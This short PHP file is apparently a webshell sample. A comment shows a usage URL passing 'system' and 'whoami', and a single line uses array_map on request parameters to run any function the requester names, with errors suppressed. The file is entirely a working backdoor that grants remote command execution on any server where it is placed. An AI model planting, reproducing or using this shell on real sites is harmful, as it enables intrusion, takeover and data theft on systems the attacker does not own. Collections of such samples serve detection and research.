//http://127.0.0.1/arry_map.php?func=system&code[]=whoami
<?php  @array_map($_REQUEST['func'],$_REQUEST['code']); ?>